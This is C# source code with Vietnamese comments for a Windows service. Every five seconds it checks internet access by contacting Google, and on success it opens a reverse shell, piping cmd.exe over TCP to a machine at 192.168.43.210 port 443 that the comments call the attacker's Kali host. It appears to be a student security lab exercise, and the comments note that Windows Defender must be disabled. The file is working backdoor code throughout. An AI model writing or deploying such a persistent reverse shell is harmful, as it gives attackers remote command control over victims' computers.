using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace Bai3HTTP
{
    public partial class Service1 : ServiceBase
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        public Service1()
        {
            InitializeComponent();
        }


        static StreamWriter streamWriter;

        //Hàm thực hiện tác vụ tuần hoàn của window service
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Interval = 5000;
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Start();
 
        }
        //Hàm ghi xuống file thời điểm được gọi lại để thực hiện tác vụ
        //Gọi hàm check_HTTP_Status() kiểm tra kết nối internet và mở reverse shell tới máy attacker kali nếu có internet.
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            check_HTTP_Status();
        }

        //Hàm tạo reverse shell đơn giản, không có tính năng tàng hình, cần turn off window defender để thực thi.
        //code tham khảo ở: https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
        public void Reverse_shell()
        {

            try
            {
                //Tạo kết nối tcp đến máy attacker kali có địa chỉ ip=192.168.43.210, đang lắng nghe ở port 443
                using (TcpClient client = new TcpClient("192.168.43.210", 443))
                {
                    //sử dụng TcpClient.GetStream method để gửi và nhận dữ liệu.
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();
                            //gọi thực thi process command prompt của windown
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }

            }
            catch(Exception)
            {

            }
        }
        //hàm xử lí dữ liệu đầu ra của command prompt ở windown
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
        //Hàm kiểm tra kết nối internet của máy hiện tại và gọi thực thi hàm Reverse_shell() nếu nhận được HTTP status code.
        private void check_HTTP_Status()
        {
            //gửi 1 yêu cầu HttpWebRequest đến URL của google, chờ nhận HTTP status code.
            HttpWebRequest req = WebRequest.Create(
            "https://www.google.com.vn/") as HttpWebRequest;
            HttpWebResponse rsp;
            try
            {
                rsp = req.GetResponse() as HttpWebResponse;//nếu kết nối thành công, http status code=200.
            }
            catch (WebException e)//xử lí các ngoại lệ
            {
                if (e.Response is HttpWebResponse)
                {
                    rsp = e.Response as HttpWebResponse;//các status code khác như: 301,404,502,... nhưng máy tính vẫn có internet.
                }
                else
                {
                    rsp = null;//máy tính không nhận được code do không có internet. Ghi xuống file logs cảnh báo.
                    WriteToFile("Something is wrong with network. Please check the internet connection!");
                }
            }
            if (rsp != null)//máy tính có kết nối internet, ghi xuống file logs mã code và gọi thực thi hàm tạo reverse shell đơn giản.
            {
               WriteToFile("Server responses HTTP_"+(int)rsp.StatusCode+"_"+rsp.StatusCode.ToString());
               Reverse_shell();
            }
        }
       
        private void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path)) { Directory.CreateDirectory(path); }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\Servicelog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
    }

}
